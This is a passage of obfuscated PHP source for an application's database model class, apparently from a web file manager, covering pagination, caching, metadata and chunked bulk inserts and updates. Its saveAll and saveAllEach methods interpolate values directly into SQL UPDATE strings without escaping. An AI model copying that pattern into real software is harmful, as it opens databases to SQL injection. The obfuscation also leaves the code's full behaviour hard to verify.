$ç‹Æ…åæ; } return $this; } public function limit($ÂŠÍ°Çß, $¯äíÕ¨µ = null) { $ÃÚÛÜÆü =& $_SERVER[ßğøİ]; $this->options[$ÃÚÛÜÆü[292]] = is_null($¯äíÕ¨µ) ? $ÂŠÍ°Çß : $ÂŠÍ°Çß . $ÃÚÛÜÆü[50] . $¯äíÕ¨µ; return $this; } public function page($è‚†Ú¯¾, $áÓŒ¤Û‹ = null) { $«ƒ©Ğ€ì =& $_SERVER[ßğøİ]; $this->options[$«ƒ©Ğ€ì[353]] = is_null($áÓŒ¤Û‹) ? $è‚†Ú¯¾ : $è‚†Ú¯¾ . $«ƒ©Ğ€ì[50] . $áÓŒ¤Û‹; return $this; } public function comment($©ê÷ç‡Ê) { $this->options[$_SERVER[ßğøİ][354]] = $©ê÷ç‡Ê; return $this; } public function setProperty($óúİìóÛ, $İøÌÊé) { if (property_exists($this, $óúİìóÛ)) { $this->{$óúİìóÛ} = $İøÌÊé; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\x66\x79\x54\151\155\145", "\164\x69\155\145", "\x69\156\x73\x65\162\x74\x2c\165\160\x64\141\164\145", "\x66\x75\156\143\x74\x69\157\x6e"), array("\x63\x72\x65\141\x74\145\124\x69\x6d\145", "\164\151\155\x65", "\x69\x6e\x73\145\x72\x74", "\146\165\156\143\164\151\x6f\x6e")); public function setDataAuto($¤ƒ›îà¹) { $this->dataAuto = $¤ƒ›îà¹; } public function __construct($©ˆãæÚş = '', $¬ÇçÒ²Ï = '', $áçúÂÜœ = '') { parent::__construct($©ˆãæÚş, $¬ÇçÒ²Ï, $áçúÂÜœ); } protected $tableMeta = array(); protected function _beforeInsert(&$œñòœúÛ, $ë“‰œ) { $ùÑ“éğ =& $_SERVER[ßğøİ]; if (!$this->checkDataAutoHas($ùÑ“éğ[355])) { return; } $this->dataBeforeFilter($œñòœúÛ, $ùÑ“éğ[355]); } protected function _beforeUpdate(&$üŞÍŒÀ, $•¬Ó¢òË) { $Âõºúû¸ =& $_SERVER[ßğøİ]; if (!$this->checkDataAutoHas($Âõºúû¸[356])) { return; } $this->dataBeforeFilter($üŞÍŒÀ, $Âõºúû¸[356]); } protected function _afterSelect(&$¤Ü“ş¨õ, $¼â¯š…î) { if (!is_array($¤Ü“ş¨õ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ßğøİ][357])) { return; } foreach ($¤Ü“ş¨õ as &$´ÀúÅ«Ö) { $this->dataAfterFilter($´ÀúÅ«Ö); } unset($´ÀúÅ«Ö); } protected function _afterFind(&$ãÎüŸº†, $ƒ ­¯‹¡) { if (!is_array($ãÎüŸº†)) { return; } if (!$this->checkDataAutoHas($_SERVER[ßğøİ][357])) { return; } $this->dataAfterFilter($ãÎüŸº†); } public static function textEncode($©áÎèÕİ) { if (!$©áÎèÕİ) { return $©áÎèÕİ; } $¸É´üìâ = json_encode($©áÎèÕİ); $¸É´üìâ = preg_replace_callback($_SERVER[ßğøİ][358], function ($ïŸõ‰±) { return addslashes($ïŸõ‰±[0]); }, $¸É´üìâ); return json_decode($¸É´üìâ); } public static function textDecode($‘ğ‚¾åå) { $·öÛ™ºî =& $_SERVER[ßğøİ]; $Ï•«Ó¿ = json_encode($‘ğ‚¾åå); $Ï•«Ó¿ = preg_replace_callback($·öÛ™ºî[359], function ($ôõ‰¶«Ñ) { return $_SERVER[ßğøİ][97]; }, $Ï•«Ó¿); return json_decode($Ï•«Ó¿); } public function setAutoIncrement($–ÆÔ¤²˜) { $ü¨öä±® = array($this->getPk() => $–ÆÔ¤²˜); $ø¯¸²Õç = $this->data($ü¨öä±®)->add(); if ($ø¯¸²Õç) { $this->delete($ø¯¸²Õç); } } public function getAutoIncrement() { $™©î·œĞ = $this->getTableName(); $¯ò¢í§° = $this->max($this->getPk()); $”Ñ•éŠı = $this->query("\163\150\157\x77\x20\x74\141\142\154\145\x20\163\164\141\x74\x75\x73\x20\167\150\145\162\145\x20\x4e\x61\x6d\145\75\x27{$™©î·œĞ}\47"); $ç­¢úí = $”Ñ•éŠı[0][$_SERVER[ßğøİ][360]]; $ªšçœßƒ = max($¯ò¢í§°, $ç­¢úí); return $ªšçœßƒ; } protected function _callBefore($æøÎë“ğ, $¡öã‹ñ) { return $this->cacheCallCheck($æøÎë“ğ, $¡öã‹ñ, !1); } protected function _callAfter($çÑóÜ¤ô, $ÕµÀ±íŠ) { return $this->cacheCallCheck($çÑóÜ¤ô, $ÕµÀ±íŠ, !0); } protected function cacheFunctionAlias($ÜŒóØÁ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($’¹ÃíÅ‡, $Æ˜å‡š¨, $à¾«÷Á¶ = false) { $²Öı‘ì¥ = $this->cacheFunctionAlias($Æ˜å‡š¨); if (!$²Öı‘ì¥) { return; } foreach ($²Öı‘ì¥ as $Ç†Äõó => $™™¸âÃè) { $¼ ¶ØĞå = $™™¸âÃè[0]; $¶³üüËÉ = explode($_SERVER[ßğøİ][50], $™™¸âÃè[1]); if ($’¹ÃíÅ‡ == $Ç†Äõó) { return $this->cacheFunctionGet($Ç†Äõó, $¼ ¶ØĞå); } if ($à¾«÷Á¶ && in_array($’¹ÃíÅ‡, $¶³üüËÉ)) { $this->cacheFunctionClear($Ç†Äõó, $¼ ¶ØĞå); } } } public function cacheFunctionGet($åâ™œ›€, $ÌÙßà¿É) { $¨æ·èèÙ = $this->cacheKeyMake($åâ™œ›€, $ÌÙßà¿É); $–é‚·†ù = Cache::get($¨æ·èèÙ); if (!is_array($–é‚·†ù)) { $–é‚·†ù = call_user_func_array(array($this, $åâ™œ›€), array($ÌÙßà¿É, !0)); Cache::set($¨æ·èèÙ, $–é‚·†ù); } return $–é‚·†ù; } public function cacheFunctionClear($·Â‹„¤×, $ˆ«™ÛŠÁ) { $ô¦¤œ  = $ˆ«™ÛŠÁ; if (!is_array($ˆ«™ÛŠÁ)) { $ô¦¤œ  = array($ˆ«™ÛŠÁ); } foreach ($ô¦¤œ  as $ßÖõÉâ‘) { $ÆÃºÎÂ‚ = $this->cacheKeyMake($·Â‹„¤×, $ßÖõÉâ‘); Cache::remove($ÆÃºÎÂ‚); } } private function cacheKeyMake($¤“­Ò¾í, $ìå­¤ìÉ) { $¿‘è¡û =& $_SERVER[ßğøİ]; return get_class($this) . $¿‘è¡û[11] . $¤“­Ò¾í . $¿‘è¡û[361] . $ìå­¤ìÉ; } protected function selectPageReset() { $›„­µÉ¤ =& $_SERVER[ßğøİ]; if (isset($GLOBALS[$›„­µÉ¤[362]])) { return; } $GLOBALS[$›„­µÉ¤[362]] = isset($GLOBALS[$›„­µÉ¤[7]][$›„­µÉ¤[363]]) ? $GLOBALS[$›„­µÉ¤[7]][$›„­µÉ¤[363]] : !1; $GLOBALS[$›„­µÉ¤[364]] = isset($GLOBALS[$›„­µÉ¤[7]][$›„­µÉ¤[353]]) ? $GLOBALS[$›„­µÉ¤[7]][$›„­µÉ¤[353]] : !1; $GLOBALS[$›„­µÉ¤[7]][$›„­µÉ¤[363]] = !1; $GLOBALS[$›„­µÉ¤[7]][$›„­µÉ¤[353]] = !1; } protected function selectPageRestore() { $‘°Óß×½ =& $_SERVER[ßğøİ]; if (!isset($GLOBALS[$‘°Óß×½[362]])) { return; } $GLOBALS[$‘°Óß×½[7]][$‘°Óß×½[363]] = $GLOBALS[$‘°Óß×½[362]]; $GLOBALS[$‘°Óß×½[7]][$‘°Óß×½[353]] = $GLOBALS[$‘°Óß×½[364]]; if ($GLOBALS[$‘°Óß×½[7]][$‘°Óß×½[363]] === !1) { unset($GLOBALS[$‘°Óß×½[7]][$‘°Óß×½[363]]); } if ($GLOBALS[$‘°Óß×½[7]][$‘°Óß×½[353]] === !1) { unset($GLOBALS[$‘°Óß×½[7]][$‘°Óß×½[353]]); } unset($GLOBALS[$‘°Óß×½[362]]); unset($GLOBALS[$‘°Óß×½[364]]); } protected function selectPage($Õ¥èÂ = 200, $ê¹Áä¸± = 1) { $‚è´åø =& $_SERVER[ßğøİ]; global $in; $–œƒ•§Å = $this->optionsValue(); $Ñ¯±äÉ“ = 50000; $Õ¥èÂ = isset($in[$‚è´åø[363]]) && $in[$‚è´åø[363]] ? $in[$‚è´åø[363]] : $Õ¥èÂ; if ($Õ¥èÂ === -1) { $in[$‚è´åø[363]] = !1; $Ñ¯±äÉ“ = 100000000; $Õ¥èÂ = $Ñ¯±äÉ“; } $Ûº¡§È· = $–œƒ•§Å; $Ûº¡§È·[$‚è´åø[365]] = array(); $Õ¥èÂ = intval($Õ¥èÂ); $Õ¥èÂ = $Õ¥èÂ <= 5 ? 5 : ($Õ¥èÂ >= $Ñ¯±äÉ“ ? $Ñ¯±äÉ“ : $Õ¥èÂ); $ê¹Áä¸± = intval(isset($in[$‚è´åø[353]]) && $in[$‚è´åø[353]] ? $in[$‚è´åø[353]] : $ê¹Áä¸±); $ê¹Áä¸± = $ê¹Áä¸± <= 1 ? 1 : $ê¹Áä¸±; $‰õ Ï‡Ü = array(); $é’…ù¿ = 1; if ($ê¹Áä¸± == 1 && $é’…ù¿) { $this->optionsValue($–œƒ•§Å); $‰õ Ï‡Ü = $this->page($ê¹Áä¸±, $Õ¥èÂ)->select(); $ï³ÑŸÈü = is_array($‰õ Ï‡Ü) ? count($‰õ Ï‡Ü) : 0; if ($ï³ÑŸÈü < $Õ¥èÂ) { $ıú“Õ£› = 1; } else { $this->optionsValue($Ûº¡§È·); $ï³ÑŸÈü = intval($this->count()); $ıú“Õ£› = ceil($ï³ÑŸÈü / $Õ¥èÂ); } } else { $this->optionsValue($Ûº¡§È·); $ï³ÑŸÈü = intval($this->count()); $ıú“Õ£› = ceil($ï³ÑŸÈü / $Õ¥èÂ); $ê¹Áä¸± = $ê¹Áä¸± >= $ıú“Õ£› ? $ıú“Õ£› : $ê¹Áä¸±; $this->optionsValue($–œƒ•§Å); $‰õ Ï‡Ü = $this->page($ê¹Áä¸±, $Õ¥èÂ)->select(); } if (!is_array($‰õ Ï‡Ü)) { $‰õ Ï‡Ü = array(); } if ($ıú“Õ£› == 1) { $ï³ÑŸÈü = count($‰õ Ï‡Ü); } $ªÓŞ‰û“ = array($‚è´åø[366] => array($‚è´åø[367] => $ï³ÑŸÈü, $‚è´åø[363] => $Õ¥èÂ, $‚è´åø[353] => $ê¹Áä¸±, $‚è´åø[368] => $ıú“Õ£›), $‚è´åø[369] => $‰õ Ï‡Ü); return $ªÓŞ‰û“; } protected function checkLength($…áëšÍ¬, $Î¢£şÑ° = 0, $»‹˜’‚É = '') { $à¬îÎ²ˆ =& $_SERVER[ßğøİ]; $Î¢£şÑ° = $Î¢£şÑ° ? $Î¢£şÑ° : 65536; if (!$…áëšÍ¬ || strlen($…áëšÍ¬) < $Î¢£şÑ°) { return; } $»‹˜’‚É = $»‹˜’‚É ? $»‹˜’‚É . $à¬îÎ²ˆ[71] : $à¬îÎ²ˆ[12]; show_json($»‹˜’‚É . LNG($à¬îÎ²ˆ[370]) . "\50{$Î¢£şÑ°}\51", !1); } protected function metaSet($‘‹ÔÊö¨, $ÚÒÊêÊ = null, $‹Ø™ŸãÀ = null) { $‰•Õ­’Ä =& $_SERVER[ßğøİ]; if (!$this->tableMeta || !$‘‹ÔÊö¨) { return !1; } $Ç®»Ãõ = $this->tableMeta[$‰•Õ­’Ä[371]]; $äÌéëÇë = $this->tableMeta[$‰•Õ­’Ä[372]]; $§Ô¿·œ» = Model($äÌéëÇë); $‡›¬Úèê = array($Ç®»Ãõ => $‘‹ÔÊö¨, $‰•Õ­’Ä[373] => $ÚÒÊêÊ); if (is_null($ÚÒÊêÊ)) { return $§Ô¿·œ»->where(array($Ç®»Ãõ => $‘‹ÔÊö¨))->delete(); } if (is_null($‹Ø™ŸãÀ) && is_string($ÚÒÊêÊ)) { return $§Ô¿·œ»->where($‡›¬Úèê)->delete(); } $˜«âãÛ = is_array($ÚÒÊêÊ) ? $ÚÒÊêÊ : array(); if (is_string($ÚÒÊêÊ)) { $˜«âãÛ[$ÚÒÊêÊ] = $‹Ø™ŸãÀ; } $³÷üı = array(); foreach ($˜«âãÛ as $ÔÇ¯úè => $ãã”á€ì) { if (is_null($ãã”á€ì) && is_string($ÔÇ¯úè)) { $§Ô¿·œ»->where(array($Ç®»Ãõ => $‘‹ÔÊö¨, $‰•Õ­’Ä[373] => $ÔÇ¯úè))->delete(); continue; } $this->checkLength($ãã”á€ì, !1, $äÌéëÇë . $‰•Õ­’Ä[4] . $ÔÇ¯úè); $³÷üı[] = array($Ç®»Ãõ => $‘‹ÔÊö¨, $‰•Õ­’Ä[94] => $ÔÇ¯úè, $‰•Õ­’Ä[374] => $ãã”á€ì); } $£¹ïåÖÏ = $‰•Õ­’Ä[375] . $äÌéëÇë; CacheLock::lock($£¹ïåÖÏ); $§Ô¿·œ»->where(array($Ç®»Ãõ => $‘‹ÔÊö¨))->addAll($³÷üı, array(), !0); CacheLock::unlock($£¹ïåÖÏ); return !0; } public function metaGet($šê¯¾ç‘, $ÅÙĞ¢‘ß = false) { $Áı÷‰ê =& $_SERVER[ßğøİ]; if (!$this->tableMeta) { return array(); } $®ÇïÌ¢‘ = $this->tableMeta[$Áı÷‰ê[371]]; $ğ°¥Ôå¬ = Model($this->tableMeta[$Áı÷‰ê[372]]); if ($ÅÙĞ¢‘ß) { $°ÜûÀ§Ÿ = array($®ÇïÌ¢‘ => $šê¯¾ç‘, $Áı÷‰ê[94] => $ÅÙĞ¢‘ß); return $ğ°¥Ôå¬->where($°ÜûÀ§Ÿ)->getField($Áı÷‰ê[374]); } $°ÜûÀ§Ÿ = array($®ÇïÌ¢‘ => $šê¯¾ç‘); $ÍÉù‰ş = $ğ°¥Ôå¬->field($Áı÷‰ê[376])->where($°ÜûÀ§Ÿ)->select(); $ÍÉù‰ş = array_to_keyvalue($ÍÉù‰ş, $Áı÷‰ê[94], $Áı÷‰ê[374]); return $ÍÉù‰ş; } private function checkDataAutoHas($¢ª—ºİÈ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $öï’”ç§) { if (in_array($¢ª—ºİÈ, explode($_SERVER[ßğøİ][50], $öï’”ç§[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$—ïÕ‡², $Ü¦åû§à) { $à·ñ»„² =& $_SERVER[ßğøİ]; if (!is_array($—ïÕ‡²)) { return; } foreach ($this->dataAuto as $Òˆ®¡œ®) { $ÒŠıó¤® = $Òˆ®¡œ®[0]; if (!in_array($Ü¦åû§à, explode($à·ñ»„²[50], $Òˆ®¡œ®[2]))) { continue; } switch (trim($Òˆ®¡œ®[3])) { case $à·ñ»„²[321]: case $à·ñ»„²[322]: $«Æ³ÚŠÑ = $Òˆ®¡œ®[1]; $Ğæ¯ô’ù = isset($Òˆ®¡œ®[4]) ? (array) $Òˆ®¡œ®[4] : array(); if ($«Æ³ÚŠÑ == $à·ñ»„²[203] && array_key_exists($ÒŠıó¤®, $—ïÕ‡²)) { if (!$—ïÕ‡²[$ÒŠıó¤®]) { unset($—ïÕ‡²[$ÒŠıó¤®]); } break; } if (isset($—ïÕ‡²[$ÒŠıó¤®])) { array_unshift($Ğæ¯ô’ù, $—ïÕ‡²[$ÒŠıó¤®]); } if ($à·ñ»„²[321] == $Òˆ®¡œ®[3]) { $—ïÕ‡²[$ÒŠıó¤®] = call_user_func_array($«Æ³ÚŠÑ, $Ğæ¯ô’ù); } else { $—ïÕ‡²[$ÒŠıó¤®] = call_user_func_array(array(&$this, $«Æ³ÚŠÑ), $Ğæ¯ô’ù); } break; case $à·ñ»„²[270]: if (isset($—ïÕ‡²[$ÒŠıó¤®]) && $—ïÕ‡²[$ÒŠıó¤®]) { $—ïÕ‡²[$ÒŠıó¤®] = call_user_func_array(array(&$this, $Òˆ®¡œ®[1]), array($—ïÕ‡²[$ÒŠıó¤®])); } break; case $à·ñ»„²[273]: $—ïÕ‡²[$ÒŠıó¤®] = $—ïÕ‡²[$Òˆ®¡œ®[1]]; break; case $à·ñ»„²[294]: if (isset($—ïÕ‡²[$ÒŠıó¤®]) && !is_string($—ïÕ‡²[$ÒŠıó¤®])) { $—ïÕ‡²[$ÒŠıó¤®] = json_encode_force($—ïÕ‡²[$ÒŠıó¤®]); } break; case $à·ñ»„²[323]: if ($—ïÕ‡²[$ÒŠıó¤®] === $à·ñ»„²[12]) { unset($—ïÕ‡²[$ÒŠıó¤®]); } break; case $à·ñ»„²[324]: $—ïÕ‡²[$ÒŠıó¤®] = $Òˆ®¡œ®[1]; default: break; } } if ($Ü¦åû§à == $à·ñ»„²[355]) { $½½©òšó = strtolower($this->db->getDbType()); if (strpos($½½©òšó, $à·ñ»„²[13]) !== 0) { return; } $¤¨ËÄ»¾ = $this->field(!0)->fields; $öü¹´Í = $¤¨ËÄ»¾[$à·ñ»„²[252]]; if (isset($¤¨ËÄ»¾[$à·ñ»„²[251]])) { unset($öü¹´Í[$¤¨ËÄ»¾[$à·ñ»„²[251]]]); } foreach ($öü¹´Í as $»Ê’Ñ¯ => $Ü¦åû§à) { if (!isset($—ïÕ‡²[$»Ê’Ñ¯])) { $—ïÕ‡²[$»Ê’Ñ¯] = $à·ñ»„²[12]; } } } } private function dataAfterFilter(&$Ó¤ëç) { $­ŞŒì– =& $_SERVER[ßğøİ]; foreach ($this->dataAuto as $˜ÀèÔ©ª) { $€²†÷Æ = $˜ÀèÔ©ª[0]; if (!isset($Ó¤ëç[$€²†÷Æ])) { continue; } if (!in_array($­ŞŒì–[357], explode($­ŞŒì–[50], $˜ÀèÔ©ª[2]))) { continue; } switch (trim($˜ÀèÔ©ª[3])) { case $­ŞŒì–[321]: case $­ŞŒì–[322]: $ÃÌ‹‚ÙŞ = isset($˜ÀèÔ©ª[4]) ? (array) $˜ÀèÔ©ª[4] : array(); array_unshift($ÃÌ‹‚ÙŞ, $Ó¤ëç[$€²†÷Æ]); if (isset($˜ÀèÔ©ª[4]) && $˜ÀèÔ©ª[4] == $­ŞŒì–[377]) { $ÃÌ‹‚ÙŞ = array($Ó¤ëç[$€²†÷Æ]); } if ($­ŞŒì–[321] == $˜ÀèÔ©ª[3]) { $Ó¤ëç[$€²†÷Æ] = call_user_func_array($˜ÀèÔ©ª[1], $ÃÌ‹‚ÙŞ); } else { $Ó¤ëç[$€²†÷Æ] = call_user_func_array(array(&$this, $˜ÀèÔ©ª[1]), $ÃÌ‹‚ÙŞ); } break; case $­ŞŒì–[270]: if (isset($Ó¤ëç[$€²†÷Æ]) && $Ó¤ëç[$€²†÷Æ]) { $Ó¤ëç[$€²†÷Æ] = call_user_func_array(array(&$this, $˜ÀèÔ©ª[1]), array($Ó¤ëç[$€²†÷Æ])); } break; case $­ŞŒì–[273]: $Ó¤ëç[$€²†÷Æ] = $Ó¤ëç[$˜ÀèÔ©ª[1]]; break; case $­ŞŒì–[294]: $êòÅçß = $Ó¤ëç[$€²†÷Æ]; $Ó¤ëç[$€²†÷Æ] = json_decode($êòÅçß, !0); if (is_null($Ó¤ëç[$€²†÷Æ])) { $Ó¤ëç[$€²†÷Æ] = $êòÅçß; } break; case $­ŞŒì–[323]: if ($Ó¤ëç[$€²†÷Æ] === $­ŞŒì–[12]) { unset($Ó¤ëç[$€²†÷Æ]); } break; case $­ŞŒì–[324]: $Ó¤ëç[$€²†÷Æ] = $˜ÀèÔ©ª[1]; break; default: break; } } } public function saveAll($ŠÈšßĞŒ) { $ùíÛ¯¿» =& $_SERVER[ßğøİ]; $Ñİ½‰¦ = $this->tablePrefix . $this->tableName; $¥¶Ì®·Å = self::SQL_WHERE_IN_CHUNK; $ŠÈšßĞŒ = is_array($ŠÈšßĞŒ) ? $ŠÈšßĞŒ : array(); $ùİ“½Õò = $ùíÛ¯¿»[378]; $–ÖÓ¥…² = 0; $ûÆ¡¶õë = array(); $ïÛãÍ = count($ŠÈšßĞŒ); for ($Ê’ÜíÎ = 0; $Ê’ÜíÎ < $ïÛãÍ; $Ê’ÜíÎ++) { $§áíƒÈĞ = $ŠÈšßĞŒ[$Ê’ÜíÎ]; if (!is_array($§áíƒÈĞ) || count($§áíƒÈĞ) != 4) { continue; } $ì´ÒÚ” = "\x55\x50\104\101\124\x45\x20\x60{$Ñİ½‰¦}\x60\x20\123\x45\124\x20{$§áíƒÈĞ[2]}\40\x3d\40\x43\101\x53\105\x20{$§áíƒÈĞ[0]}\40\xa"; if ($–ÖÓ¥…² == 0) { $ùİ“½Õò = $ì´ÒÚ”; } $ûÆ¡¶õë[] = $ùíÛ¯¿»[118] . $§áíƒÈĞ[1] . $ùíÛ¯¿»[118]; $–ÖÓ¥…²++; $ùİ“½Õò .= "\40\127\x48\105\x4e\x20\47{$§áíƒÈĞ[1]}\x27\40\x54\110\x45\x4e\40\x27{$§áíƒÈĞ[3]}\x27\x20\xa"; if ($–ÖÓ¥…² == $¥¶Ì®·Å || $Ê’ÜíÎ == $ïÛãÍ - 1) { $Æ¼í”²ß = implode($ùíÛ¯¿»[50], $ûÆ¡¶õë); $ùİ“½Õò .= "\x20\x45\116\x44\40\40\x57\110\105\x52\x45\x20{$§áíƒÈĞ[0]}\40\x49\x4e\x20\50{$Æ¼í”²ß}\51\40"; $this->execute($ùİ“½Õò); $–ÖÓ¥…² = 0; $ùİ“½Õò = $ì´ÒÚ”; $this->chunkEventCheck(count($ûÆ¡¶õë)); $ûÆ¡¶õë = array(); } } $this->chunkEventSet(); } public function saveAllEach($Šàå÷ñÜ) { $ŞÏêß„ =& $_SERVER[ßğøİ]; $×•¬™ò = $this->tablePrefix . $this->tableName; foreach ($Šàå÷ñÜ as $¯Ò¸á²ò) { if (!is_array($¯Ò¸á²ò) || count($¯Ò¸á²ò) != 4) { continue; } $¸±Úë©” = $¯Ò¸á²ò[0] . $ŞÏêß„[379] . $¯Ò¸á²ò[1] . $ŞÏêß„[118]; $‘ºÁÌÍ = $¯Ò¸á²ò[2] . $ŞÏêß„[379] . $¯Ò¸á²ò[3] . $ŞÏêß„[118]; $å©¶ñº÷ = "\165\x70\x64\141\x74\145\40{$×•¬™ò}\40\x73\145\164\40{$‘ºÁÌÍ}\x20\x77\150\x65\162\145\40{$¸±Úë©”}\x3b"; $this->execute($å©¶ñº÷); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ÌÎëİ¬è = false, $Ú»ˆ€Ñ = false) { $this->_chunkEvent = $ÌÎëİ¬è; $this->_chunkEventParam = $Ú»ˆ€Ñ; } private function chunkEventCheck($Åè¼ñ”ø) { if (!$this->_chunkEvent) { return; } $Âíû…¹á = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Âíû…¹á[$_SERVER[ßğøİ][380]] = $Åè¼ñ”ø; Hook::trigger($this->_chunkEvent, $Âíû…¹á); } public function addAll($ÒÌğÍŒ, $¥õ·ÁÏÆ = array(), $¨ï¯œç¢ = false) { $†ÁÄı™‡ =& $_SERVER[ßğøİ]; ignore_timeout(); $ñçÏİì = self::SQL_WHERE_IN_CHUNK; if (empty($ÒÌğÍŒ)) { $this->error = think_lang($†ÁÄı™‡[271]); return !1; } $¥õ·ÁÏÆ = $this->_parseOptions($¥õ·ÁÏÆ); foreach ($ÒÌğÍŒ as $©™Ş—Æ« => $‚›¢¹Šû) { $ÒÌğÍŒ[$©™Ş—Æ«] = $this->_facade($‚›¢¹Šû); $this->_beforeInsert($ÒÌğÍŒ[$©™Ş—Æ«], $¥õ·ÁÏÆ); } if (method_exists($this->db, $†ÁÄı™‡[272])) { for ($´ô¾å€ = 0; $´ô¾å€ < count($ÒÌğÍŒ); $´ô¾å€ += $ñçÏİì) { $Ë Õè† = array_slice($ÒÌğÍŒ, $´ô¾å€, $ñçÏİì); if (!is_array($Ë Õè†) || count($Ë Õè†) == 0) { break; } $ò¿Ç†¯ = $this->db->insertAll($Ë Õè†, $¥õ·ÁÏÆ, $¨ï¯œç¢); $this->chunkEventCheck(count($Ë Õè†)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÒÌğÍŒ as $©™Ş—Æ« => $‚›¢¹Šû) { $ò¿Ç†¯ = $this->db->insert($‚›¢¹Šû, $¥õ·ÁÏÆ, $¨ï¯œç¢); } $this->commit(); } if (!1 !== $ò¿Ç†¯) { $ç±‘ù„å = $this->getLastInsID(); if ($ç±‘ù„å) { return $ç±‘ù„å; } } return $ò¿Ç†¯; } public function save($ä¬Éé»÷ = '', $Â¯»§Šò = array()) { $–¯ÈøôÆ =& $_SERVER[ßğøİ]; $¤îÂ®¹ = self::SQL_WHERE_IN_CHUNK; $Şº¶Ú’ = $this->optionsValue(); $È±ÃŸ¾ = $this->findWhereField($Şº¶Ú’); if (!$È±ÃŸ¾) { return parent::save($ä¬Éé»÷, $Â¯»§Šò); } $ÍïÚÚ»İ = 0; $şÒáÍß‰ = $Şº¶Ú’[$–¯ÈøôÆ[275]][$È±ÃŸ¾][1]; $şÒáÍß‰ = is_array($şÒáÍß‰) ? $şÒáÍß‰ : array(); $ì¾İ´®ˆ = count($şÒáÍß‰); for ($„”ïÃúÏ = 0; $„”ïÃúÏ < $ì¾İ´®ˆ; $„”ïÃúÏ += $¤îÂ®¹) { $ùç¬»ê = array_slice($şÒáÍß‰, $„”ïÃúÏ, $¤îÂ®¹); if (!is_array($ùç¬»ê) || count($ùç¬»ê) == 0) { break; } $Şº¶Ú’[$–¯ÈøôÆ[275]][$È±ÃŸ¾][1] = $ùç¬»ê; $this->optionsValue($Şº¶Ú’); $ÍïÚÚ»İ += parent::save($ä¬Éé»÷, $Â¯»§Šò); $this->chunkEventCheck(count($ùç¬»ê)); } $this->chunkEventSet(); return $ÍïÚÚ»İ; } public function add($èš‚Äƒö = '', $Åêõ´Ş¼ = array(), $ªô¯‰Èõ = false) { if ($this->addTaskStatus && is_array($èš‚Äƒö)) { $this->addTaskData[] = $èš‚Äƒö; return; } return parent::add($èš‚Äƒö, $Åêõ´Ş¼, $ªô¯‰Èõ); } public function parseWhereLike($ÓÉª«ù, $Œô¥¾îÀ = '', $¡³ÊÄÂ’ = false, &$‘ÆÍğ¢˜ = false) { $€İÆÔíş =& $_SERVER[ßğøİ]; $ğªç«âé = $GLOBALS[$€İÆÔíş[6]][$€İÆÔíş[381]]; if (!$ğªç«âé[$€İÆÔíş[382]]) { return $ÓÉª«ù; } if (!is_array($ÓÉª«ù)) { return $ÓÉª«ù; } $ı¢á®æò = array(); $—Ğ±¦½ = 0; foreach ($ÓÉª«ù as $õºÄÆû… => $úåõ‹ï²) { if (is_array($úåõ‹ï²) && count($úåõ‹ï²) == 2 && $úåõ‹ï²[0] == $€İÆÔíş[383] && is_string($úåõ‹ï²[1]) && substr($úåõ‹ï²[1], 0, 1) == $€İÆÔíş[384] && substr($úåõ‹ï²[1], strlen($úåõ‹ï²[1]) - 1, 1) == $€İÆÔíş[384]) { $‘ÆÍğ¢˜ = !0; $¼°×ÉÏ = is_string($õºÄÆû…) ? $õºÄÆû… : $Œô¥¾îÀ; $Õú¢ïãš = substr($úåõ‹ï²[1], 1, strlen($úåõ‹ï²[1]) - 2); $Õú¢ïãš = $this->db->escapeString($Õú¢ïãš); if (!strpos($¼°×ÉÏ, $€İÆÔíş[10])) { $¼°×ÉÏ = $€İÆÔíş[385] . $¼°×ÉÏ . $€İÆÔíş[385]; } $²ì¿é¹ = $€İÆÔíş[188] . $Õú¢ïãš . $€İÆÔíş[188]; $Õú¢ïãš = str_replace(array($€İÆÔíş[10], $€İÆÔíş[386], $€İÆÔíş[11]), $€İÆÔíş[387], $Õú¢ïãš); if ($ğªç«âé[$€İÆÔíş[388]]) { $²ì¿é¹ = $€İÆÔíş[389] . $Õú¢ïãš . $€İÆÔíş[390]; if ($ğªç«âé[$€İÆÔíş[391]]) { $²ì¿é¹ = $€İÆÔíş[390] . $Õú¢ïãš . $€İÆÔíş[389]; } } $ı¢á®æò[$—Ğ±¦½] = $€İÆÔíş[392] . $¼°×ÉÏ . $€İÆÔíş[393] . $²ì¿é¹ . $€İÆÔíş[394]; $—Ğ±¦½++; continue; } if (is_array($úåõ‹ï²)) { $Œô¥¾îÀ = is_string($õºÄÆû…) ? $õºÄÆû… : $Œô¥¾îÀ; $úåõ‹ï² = $this->parseWhereLike($úåõ‹ï², $Œô¥¾îÀ, !0, $‘ÆÍğ¢˜); } if (is_numeric($õºÄÆû…)) { $ı¢á®æò[$—Ğ±¦½] = $úåõ‹ï²; $—Ğ±¦½++; } else { $ı¢á®æò[$õºÄÆû…] = $úåõ‹ï²; } } if ($‘ÆÍğ¢˜ && !$¡³ÊÄÂ’) { } return $ı¢á®æò; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Éıø‹©Ï = array()) { $£òä¸ïŸ =& $_SERVER[ßğøİ]; $— çÊÜ¸ = self::SQL_WHERE_IN_CHUNK; $áôèùáÒ = $this->optionsValue(); $„«ª‡í = $this->findWhereField($áôèùáÒ); if (!$„«ª‡í || isset($áôèùáÒ[$£òä¸ïŸ[292]]) || isset($áôèùáÒ[$£òä¸ïŸ[353]])) { return parent::select($Éıø‹©Ï); } $İë¼Úıê = $áôèùáÒ[$£òä¸ïŸ[275]][$„«ª‡í][1]; $İë¼Úıê = is_array($İë¼Úıê) ? $İë¼Úıê : array(); $éÖ™³äŸ = null; for ($ìİ‰çŒù = 0; $ìİ‰çŒù < count($İë¼Úıê); $ìİ‰çŒù += $— çÊÜ¸) { $Â…»‡‚ = array_slice($İë¼Úıê, $ìİ‰çŒù, $— 